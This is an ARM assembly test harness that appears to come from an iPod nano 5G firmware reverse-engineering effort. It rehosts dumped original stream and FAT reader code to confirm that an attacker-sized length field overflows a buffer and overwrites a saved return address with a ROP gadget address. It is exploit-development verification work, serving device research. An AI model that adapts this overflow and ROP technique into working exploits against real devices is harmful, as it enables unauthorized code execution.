.include "/home/sebastian/ipod-re/rb-n5g/utils/ipodnano5g/analysis/evidence/accessories-rop-2026-10-29/OSOS_accessories_wrapper_fat_provider_rehost_fixedlayout_20261029.S"

.section .runtime_0819887c,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x19887c, 0x10

.section .runtime_08039048,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x39048, 0x30

/* The dumped veneer at 0x08200600 jumps to an external memcpy. */
.section .stream_memcpy,"ax",%progbits
.arm
.global stream_memcpy_stub
.type stream_memcpy_stub,%function
stream_memcpy_stub:
    cmp r2, #0
    bxeq lr
3:
    ldrb r3, [r1], #1
    strb r3, [r0], #1
    subs r2, r2, #1
    bne 3b
    bx lr
.size stream_memcpy_stub, .-stream_memcpy_stub

.section .runtime_081b832e,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x1b832e, 0x32

.section .runtime_0820cc90,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x20cc90, 0x78

.section .runtime_0823c9c0,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x23c9c0, 0x76

.section .runtime_08268c3a,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x268c3a, 0x0e

.section .runtime_0826dd26,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x26dd26, 0x0c

.section .runtime_082783be,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x2783be, 0x18

.section .runtime_082a2c48,"ax",%progbits
.thumb
.incbin "/home/sebastian/ipod-re/local-analysis/inputs/osos_runtime_dram_20261025.bin", 0x2a2c48, 0x2a

/*
 * Rehost the original buffered/exact stream readers across the already
 * rehosted original file wrapper, FAT provider, and FAT read core.
 * The stream is primed at the state after reading the 4-byte attacker length:
 * its 704-byte cache is the local wrapped candidate, and the underlying file
 * cursor is at logical EOF (0x2c0), as after a full cache fill.
 */
.section .isolated_start,"ax",%progbits
.arm
.global stream_test
.type stream_test,%function
stream_test:
    ldr sp, =stack_top

    /* Handle and file state at the end of a 704-byte file / 8-KiB cluster. */
    ldr r0, =handle_record
    ldr r1, =volume_context
    str r1, [r0]
    ldr r1, =file_metadata
    str r1, [r0, #4]
    ldr r0, =handle_entry
    ldr r1, =0x2c0
    str r1, [r0, #8]
    ldr r1, =179788
    str r1, [r0, #12]
    mov r1, #0
    str r1, [r0, #0x14]

    ldr r0, =file_metadata
    ldr r1, =0x2c0
    str r1, [r0, #0x1c]

    ldr r0, =file_object
    ldr r1, =0xfeed0001
    str r1, [r0, #0x18]
    ldr r1, =0x2c0
    str r1, [r0, #0x20]
    str r1, [r0, #0x34]
    mov r1, #0
    str r1, [r0, #0x38]

    /* The read buffer and cache-sector stub match the previous provider test. */
    ldr r0, =cache_data
    mov r1, #0x41
    mov r2, #0x200
1:
    strb r1, [r0], #1
    subs r2, r2, #1
    bne 1b
    ldr r0, =read_buffer
    mov r1, #0xcc
    ldr r2, =0x2001
2:
    strb r1, [r0], #1
    subs r2, r2, #1
    bne 2b
    ldr r0, =read_count
    mov r1, #0
    str r1, [r0]

    /* Prime the stream at file offset 0x1c before the original length helper. */
    ldr r0, =stream_object
    ldr r1, =stream_vtable
    str r1, [r0]
    mvn r1, #0
    str r1, [r0, #4]
    ldr r1, =candidate_file
    str r1, [r0, #0x0c]
    str r1, [r0, #0x14]
    ldr r1, =0x8000
    str r1, [r0, #0x18]
    ldr r1, =704
    str r1, [r0, #0x1c]
    ldr r1, =0x1c
    str r1, [r0, #0x20]
    mov r1, #0
    str r1, [r0, #0x24]
    str r1, [r0, #0x28]
    str r1, [r0, #0x2c]
    ldr r1, =file_object
    str r1, [r0, #0x30]

    /* Original FUN_08039048 reads the length and then the attacker-sized body. */
    ldr r0, =stream_handle
    mov r1, #0x100
    ldr r2, =read_buffer
    ldr r3, =length_value
    ldr r12, =0x08039049
    blx r12
    mov r4, r0
    ldr r0, =length_value
    ldr r0, [r0]
    ldr r1, =0xfffffff0
    cmp r0, r1
    bne stream_fail

    /* Store state and a sample at the parser's saved-LR offset (buffer + 0x138). */
    ldr r5, =stream_results
    str r4, [r5]
    ldr r0, =stream_object
    ldr r0, [r0, #0x24]
    str r0, [r5, #4]
    ldr r0, =file_object
    ldr r0, [r0, #0x34]
    str r0, [r5, #8]
    ldr r0, =handle_entry
    ldr r0, [r0, #8]
    str r0, [r5, #12]
    ldr r0, =handle_entry
    ldr r0, [r0, #0x14]
    str r0, [r5, #16]
    ldr r0, =file_metadata
    ldr r0, [r0, #0x1c]
    str r0, [r5, #20]
    ldr r0, =stream_object
    ldr r1, [r0, #0x1c]
    str r1, [r5, #24]
    ldr r1, [r0, #0x20]
    str r1, [r5, #28]
    ldrb r1, [r0, #0x28]
    str r1, [r5, #32]
    ldr r0, =read_buffer
    ldr r1, [r0, #0x138]
    str r1, [r5, #36]
    ldr r2, =0x1fa0
    ldr r1, [r0, r2]
    str r1, [r5, #40]
    ldr r2, =0x1fe0
    ldr r1, [r0, r2]
    str r1, [r5, #44]
    ldr r2, =0x1fdc
    ldr r1, [r0, r2]
    str r1, [r5, #48]

    /* Export a compact binary record for independent decoding. */
    mov r0, #1
    mov r1, r5
    mov r2, #52
    mov r7, #4
    svc #0

    /* A meaningful pass requires actual original stream and provider code to
       alter the saved-LR word, not merely the local cache prefix. */
    cmp r4, #5
    bne stream_fail
    ldr r0, [r5, #4]
    ldr r1, =0x1fa4
    cmp r0, r1
    bne stream_fail
    ldr r0, [r5, #8]
    ldr r1, =0x1fc0
    cmp r0, r1
    bne stream_fail
    ldr r0, [r5, #12]
    cmp r0, r1
    bne stream_fail
    ldr r0, [r5, #16]
    cmp r0, #1
    bne stream_fail
    ldr r0, [r5, #20]
    cmp r0, r1
    bne stream_fail
    ldr r0, [r5, #36]
    ldr r1, =0x08007107
    cmp r0, r1
    bne stream_fail

    /* All in-file candidate bytes reach the destination unchanged. */
    ldr r0, =candidate_file
    adds r0, r0, #0x20
    ldr r1, =read_buffer
    ldr r2, =672
4:
    ldrb r3, [r0], #1
    ldrb r7, [r1], #1
    cmp r3, r7
    bne stream_fail
    subs r2, r2, #1
    bne 4b

    /* FAT stub bytes continue through the partial cluster-end transfer. */
    ldr r1, =read_buffer
    ldr r2, =672
    add r1, r1, r2
    ldr r2, =(0x1fe0 - 672)
    mov r3, #0x41
5:
    ldrb r7, [r1], #1
    cmp r7, r3
    bne stream_fail
    subs r2, r2, #1
    bne 5b
    ldrb r7, [r1]
    cmp r7, #0xcc
    bne stream_fail
    ldr r0, =pass_text
    mov r1, #5
    mov r6, #0
    b stream_exit
stream_fail:
    ldr r0, =fail_text
    mov r1, #5
    mov r6, #1
stream_exit:
    mov r2, r1
    mov r1, r0
    mov r0, #1
    mov r7, #4
    svc #0
    mov r0, r6
    mov r7, #1
    svc #0
.size stream_test, .-stream_test
.ltorg

.section .state,"aw",%progbits
.align 4
stream_vtable:
    .space 0x18
    .word 0x082783bf
    .space 0x10
    .word 0x0820cc91
    .space 0x14
    .word 0x082a2c49
    .space 0x04
    .word 0x081b832f
.align 4
stream_object:
    .space 0x34
stream_handle:
    .word stream_object
length_value:
    .word 0
candidate_file:
    .incbin "/home/sebastian/ipod-re/rb-n5g/utils/ipodnano5g/analysis/evidence/accessories-rop-2026-10-29/candidate_accessories_reg_wrap_unexecuted.bin"
stream_results:
    .space 52
